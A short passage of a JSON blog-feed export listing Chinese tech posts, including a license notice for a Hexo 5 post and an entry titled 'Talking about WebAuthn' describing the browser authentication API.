class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]